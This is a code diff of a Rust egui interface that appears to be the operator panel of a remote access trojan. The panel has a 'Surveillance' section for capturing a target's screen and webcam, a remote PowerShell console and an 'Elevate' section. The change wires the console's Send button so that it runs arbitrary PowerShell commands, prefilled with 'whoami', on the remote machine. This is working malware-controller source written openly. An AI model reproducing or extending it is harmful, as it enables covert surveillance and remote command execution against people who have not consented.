@@ -1,62 +1,22 @@
 use core::f32;
 
-use crate::manager::types::UiManagerCommand;
+use crate::{manager::types::UiManagerCommand, ui::client::types::*};
 use egui::{
-    Button, CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton,
-    RichText, ScrollArea, Stroke, TextEdit, TextStyle, TextureHandle, Ui, Widget, Window,
+    Button, CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton, RichText, ScrollArea, Slider, Stroke, TextEdit, TextStyle, TextureHandle, Ui, Widget, Window
 };
 use shared::commands::{
     CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
 };
 use tokio::sync::mpsc::UnboundedSender;
 
-pub struct MsgboxView {
-    pub title: String,
-    pub text: String,
-}
-pub struct PowershellView {
-    pub input: String,
-    pub output: String,
-}
-impl Default for MsgboxView {
-    fn default() -> Self {
-        Self {
-            title: String::from("Title"),
-            text: String::from("Text"),
-        }
-    }
-}
+////////////////////
+pub mod types;
+mod video;
+////////////////////
 
-pub struct ClientViewCaptureState {
-    pub screen: bool,
-    pub webcam: bool,
-    pub mic: bool,
-}
-impl Default for ClientViewCaptureState {
-    fn default() -> Self {
-        Self {
-            screen: false,
-            webcam: false,
-            mic: false,
-        }
-    }
-}
-
-pub struct ClientViewCapture {
-    pub quality: CaptureQuality,
-    pub data: Option<ColorImage>,
-}
-pub struct ClientViewCaptures {
-    pub screen: ClientViewCapture,
-    pub webcam: ClientViewCapture,
-}
-pub struct ClientViewTextures {
-    pub screen: Option<TextureHandle>,
-    pub webcam: Option<TextureHandle>,
-}
 pub struct ClientViewState {
     pub visible: bool,
-    pub powershell: PowershellView,
+    pub powershell: PowerShellView,
     pub captures: ClientViewCaptures,
     pub textures: ClientViewTextures,
     pub capturing: ClientViewCaptureState,
@@ -84,17 +44,19 @@ impl ClientView {
             socket: socket,
             state: ClientViewState {
                 visible: false,
-                powershell: PowershellView {
-                    input: String::new(),
-                    output: String::new(),
+                powershell: PowerShellView {
+                    input: String::from("whoami"),
+                    output: String::from("\n"),
                 },
                 captures: ClientViewCaptures {
                     screen: ClientViewCapture {
                         quality: CaptureQuality::Speed,
+                        scale: 1.0,
                         data: None,
                     },
                     webcam: ClientViewCapture {
                         quality: CaptureQuality::Speed,
+                        scale: 1.0,
                         data: None,
                     },
                 },
@@ -121,73 +83,41 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
             CollapsingHeader::new("🔍  Surveillance")
                 .default_open(true)
                 .show(ui, |ui| {
-                    CollapsingHeader::new("🖵  Screen")
-                        .default_open(false)
-                        .show(ui, |ui| {
-                            if let Some(ref image) = view.state.captures.screen.data {
-                                if view.state.textures.screen.is_none() {
-                                    view.state.textures.screen = Some(ui.ctx().load_texture(
-                                        format!("capture_{}", view.mutex.clone()),
-                                        image.clone(),
-                                        Default::default(),
-                                    ));
-                                };
-                                if let Some(texture) = &view.state.textures.screen {
-                                    let available_size = ui.available_size();
-                                    let image_size = texture.size_vec2();
-                                    let max_width = available_size.x.min(720.0);
-                                    let max_height = available_size.y.min(560.0);
-                                    let scale_x = max_width / image_size.x;
-                                    let scale_y = max_height / image_size.y;
-                                    let scale = scale_x.min(scale_y).min(1.0);
-                                    let display_size = image_size * scale;
-                                    ui.add(Image::new(texture).max_size(display_size));
-                                }
-                            }
+                    ui.horizontal(|ui| {
 
-                            if view.state.capturing.screen {
-                                if ui.button("⏹  Stop").clicked() {
-                                    println!("[*] sending CaptureCommand::Stop");
-                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
-                                        view.mutex.clone(),
-                                        Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
-                                    ));
-                                    view.state.capturing.screen = false;
-                                }
-                            } else {
-                                if ui.button("▶  Start").clicked() {
-                                    println!("[*] sending CaptureCommand::Start");
-                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
-                                        view.mutex.clone(),
-                                        Command::Capture(
-                                            CaptureCommand::Start(
-                                                view.state.captures.screen.quality.clone(),
-                                            ),
-                                            CaptureType::Screen,
-                                        ),
-                                    ));
-                                    view.state.capturing.screen = true;
-                                };
-                            }
-
-                            //////////////////////////////////////
-                            // quality toggle
-                            ui.add_enabled_ui(!view.state.capturing.screen, |ui| {
-                                ui.horizontal(|ui| {
-                                    ui.label("Quality: ");
-                                    ui.radio_value(
-                                        &mut view.state.captures.screen.quality,
-                                        CaptureQuality::Quality,
-                                        "Slow",
-                                    );
-                                    ui.radio_value(
-                                        &mut view.state.captures.screen.quality,
-                                        CaptureQuality::Speed,
-                                        "Fast",
-                                    );
-                                });
+                        ui.vertical(|ui| {
+                            CollapsingHeader::new("🖵  Screen")
+                            .default_open(false)
+                            .show(ui, |ui| {
+                            video::render( 
+                                ui,
+                                CaptureType::Screen,
+                                &view.mutex,
+                                &view.sender,
+                                &mut view.state.captures.screen,
+                                &mut view.state.capturing.screen,
+                                &mut view.state.textures.screen,
+                            );
                             });
                         });
+
+                        ui.vertical(|ui| {
+                            CollapsingHeader::new("📸  Camera")
+                            .default_open(false)
+                            .show(ui, |ui| {
+                            video::render( 
+                                ui,
+                                CaptureType::Camera,
+                                &view.mutex,
+                                &view.sender,
+                                &mut view.state.captures.webcam,
+                                &mut view.state.capturing.webcam,
+                                &mut view.state.textures.webcam,
+                            );
+                            });
+                        });
+                        
+                    });
                 });
             CollapsingHeader::new("🗁  Utility")
                 .default_open(true)
@@ -229,22 +159,30 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                             ui.add(TextEdit::multiline(&mut view.state.powershell.input)
                         .font(TextStyle::Monospace)
                         .code_editor()
-                        .desired_rows(8)
+                        .desired_rows(4)
                         .lock_focus(true)
                         .desired_width(f32::INFINITY)
                         .layouter(&mut layouter))
                         });
                         ui.label("Output");
-                        ScrollArea::vertical().show(ui, |ui| {
-                            ui.label(
-                                RichText::new(&view.state.powershell.output)
-                                    .monospace()
-                                    .size(12.0)
-                                    .color(ui.visuals().text_color())
-                                    .text_style(TextStyle::Monospace),
-                            )
+                        egui::Frame::new().fill(ui.visuals().faint_bg_color)
+                        .corner_radius(8.0)
+                        .inner_margin(2.0)
+                        .show(ui, |ui| {
+                            ui.set_width(ui.available_width());
+                            ScrollArea::vertical().show(ui, |ui| {
+                                ui.label(
+                                    RichText::new(&view.state.powershell.output)
+                                        .monospace()
+                                        .size(10.0)
+                                        .color(ui.visuals().text_color())
+                                        .text_style(TextStyle::Monospace),
+                                )
+                            });
                         });
-                        if ui.button("Send").clicked() {};
+                        if ui.button("Send").clicked() {
+                            let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::PowerShell(view.state.powershell.input.clone())));
+                        };
                     });
                     CollapsingHeader::new("🛡  Elevate")
                         .default_open(false)
